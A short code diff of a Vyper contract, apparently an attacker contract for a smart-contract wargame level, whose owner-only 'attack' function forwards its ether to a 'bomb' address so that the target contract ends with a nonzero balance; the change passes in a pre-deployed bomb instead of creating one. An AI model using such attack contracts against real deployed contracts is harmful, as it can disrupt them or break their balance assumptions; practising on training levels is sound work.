@@ -17,8 +17,7 @@ def balanceOf() -> uint256:
     return self.instance.balance
 
 @external
-def attack(addr: address):
+def attack(bomb: address):
     assert msg.sender == owner, "!owner"
-    bomb: address = create_copy_of(addr)
     raw_call(bomb, _abi_encode(self.instance), value=self.balance)
     assert self.instance.balance > 0, "level !passed"
